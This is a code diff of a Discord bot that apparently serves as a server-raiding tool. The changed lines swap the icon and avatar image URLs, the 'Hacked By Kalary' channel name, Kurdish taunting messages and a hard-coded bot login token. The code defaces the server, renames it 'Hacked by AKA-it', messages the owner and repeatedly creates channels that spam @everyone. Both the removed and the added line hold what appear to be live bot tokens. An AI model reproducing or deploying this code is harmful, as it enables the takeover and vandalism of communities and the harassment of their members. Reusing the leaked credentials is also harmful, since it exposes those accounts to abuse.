@@ -34,21 +34,21 @@ client.on("message", message => {
           message.member.roles.add(rr.id);
         });
     }, 1000);
-    message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
-    client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
+    message.guild.setIcon("https://cdn.discordapp.com/avatars/522853685039202314/beb35fddd7e0f5f9f070adce946d601e.png?size=1024");
+    client.user.setAvatar("https://cdn.discordapp.com/avatars/522853685039202314/beb35fddd7e0f5f9f070adce946d601e.png?size=1024");
     client.user.setUsername("Hacked By Kalary");
     message.guild.owner.send(
-      "قەینا گەورە بیت بیرتەچێتەوە"
+      "قەینا گەورە بیت بیرتەچێتەوە کابرای بێمنەت"
     );
     message.guild.setName("Hacked by AKA-it");
     setTimeout(function() {
       setInterval(
         () => {
           message.guild.channels
-            .create("hacked By Kalary", "text")
+            .create("Hacked By Kalary", "text")
             .then(channel => {
               channel.send(
-                "@everyone ئەڵێ دەست درێژبێ دەمت کورتەبێ زۆر خۆو هەڵکێشی گوێو لە جڕتەبێ :joy: :joy: :joy:"
+                "   وتم شتێک ئەکەم سەری خۆمی لەسەر دانێم ئەیکەم باش بزانە بێ منەتی بەران بەر من بە هیچ شێوەیەک بونی نیە😂"
               );
             });
         },
@@ -62,4 +62,4 @@ client.on("message", message => {
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("ODg2NTk0Mjg0NTUwMjM0MTIy.YT338g.GXeY2vcgCE2oJzhPLpj6f6C1780");
+client.login("NzkyODUzNjMwMTA5MjIwOTI1.X-jwew.9xZ2Q4KHNoHveB9-9Dp1qIpaqHE");
